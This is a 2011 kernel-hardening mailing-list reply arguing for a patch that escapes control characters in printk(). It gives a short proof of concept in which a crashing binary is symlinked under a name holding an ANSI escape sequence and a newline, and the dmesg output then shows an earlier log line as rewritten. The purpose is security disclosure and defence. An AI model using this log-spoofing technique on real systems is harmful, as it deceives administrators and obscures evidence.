Reply-To: kernel-hardening@lists.openwall.com
Sender: Vasiliy Kulikov <segooon@gmail.com>
Date: Fri, 1 Jul 2011 16:54:11 +0400
From: Vasiliy Kulikov <segoon@openwall.com>
Message-ID: <20110701125411.GA21551@albatros>
References: <20110626182628.GA20158@elte.hu>
 <20110626190622.GB4217@albatros>
 <20110626194618.GA21740@elte.hu>
 <20110626202518.GA4915@albatros>
 <20110626220126.GA24004@elte.hu>
 <20110627083633.GA5846@albatros>
 <20110627104058.45e93c41@pyx>
 <20110627183829.GA16033@albatros>
 <BANLkTikyzxXgfFuwBRdDLvrRN4+fExMwWA@mail.gmail.com>
 <20110701120059.GL20990@elte.hu>
MIME-Version: 1.0
Content-Type: text/plain; charset=utf-8
Content-Disposition: inline
Content-Transfer-Encoding: 8bit
In-Reply-To: <20110701120059.GL20990@elte.hu>
Subject: Re: [kernel-hardening] Re: [PATCH v2] kernel: escape non-ASCII and
 control characters in printk()
To: kernel-hardening@lists.openwall.com
Cc: Linus Torvalds <torvalds@linux-foundation.org>, Alan Cox <alan@lxorguk.ukuu.org.uk>, Andrew Morton <akpm@linux-foundation.org>, James Morris <jmorris@namei.org>, Namhyung Kim <namhyung@gmail.com>, Greg Kroah-Hartman <gregkh@suse.de>, linux-kernel@vger.kernel.org
List-ID: <kernel-hardening.lists.openwall.com>

On Fri, Jul 01, 2011 at 14:00 +0200, Ingo Molnar wrote:
> 
> * Linus Torvalds <torvalds@linux-foundation.org> wrote:
> 
> > On Mon, Jun 27, 2011 at 11:38 AM, Vasiliy Kulikov <segoon@openwall.com> wrote:
> > >
> > > Sure, I don't propose it anymore (v2 goes without it).
> > 
> > What point would you like to filter things at?
> > 
> > I really think that user space should do its own filtering - nobody
> > does a plain 'cat' on dmesg. Or if they do, they really have
> > themselves to blame.

Some people do "dmesg | tail" or "grep -i err /var/log/messages".  Or
even "tail -f /var/log/messages".

http://www.google.com/search?q=grep+var+log+messages

> > And afaik, we don't do any escape sequence handling at the console
> > level either, so you cannot mess up the console with control
> > characters.
> > 
> > And the most dangerous character seems to be one that you don't
> > filter: the one we really do react to is '\n', and you could possibly
> > make confusing log messages by embedding a newline in your string and
> > then trying to make the rest look like something bad (say, an oops).
> > 
> > So I'm not entirely convinced about this filtering at all.
> 
> Yeah. It would be nice to see a demonstration of at least one 'bad 
> thing' that is possible via the current code, before we protect 
> against it.
> 
> The claim the patch makes is rather specific:
> 
>  | There are numerous printk() instances with user supplied input as 
>  | "%s" data, and unprivileged user may craft log messages with 
>  | substrings containing control characters via these printk()s.  
>  | Control characters might fool root viewing the logs via tty, e.g. 
>  | using ^[1A to suppress the previous log line.
> 
> So it ought to be demonstrable.

Read this mail again:

http://www.openwall.com/lists/kernel-hardening/2011/06/22/6

Using the instance of the bug in core dump code that Willy used here for
\n thing:

http://www.openwall.com/lists/kernel-hardening/2011/06/25/3


We get:

$ echo "main() { sprintf((char*)3, (char*)1); }" | gcc -xc -o ../1234 -
$ ln -s ../1234 $'\x1b[1Ainit\nfail'

Now generate an arbitrary log message:

$ ../1234 
Ошибка сегментирования (core dumped)
$ dmesg | tail -n1
[16291.982492] 1234[21579]: segfault at 0 ip 00007f527186028a sp 00007fff08251dd8 error 4 in libc-2.11.1.so[7f52717d8000+17a000]

Change this log entry:

$ './^[[1Ainit
fail' 
Ошибка сегментирования (core dumped)

$ dmesg | tail
...
[16291.982492] init[21579]: segfault at 0 ip 00007f527186028a sp 00007fff08251dd8 error 4 in libc-2.11.1.so[7f52717d8000+17a000]
[16379.001357] fail[21586]: segfault at 0 ip 00007f332831028a sp 00007fffc52de568 error 4 in libc-2.11.1.so[7f3328288000+17a000]
$ 
(see 1234 => init change)

As you see here, the previous log entry was showed not as it was
initally logged.  Core dump message was chosen fully arbitrary, just to
show that some specific part of it can be "edited".


If this step-by-step instruction is not a proof, then I don't know what
the word "proof" means...

-- 
Vasiliy Kulikov
http://www.openwall.com - bringing security into open computing environments
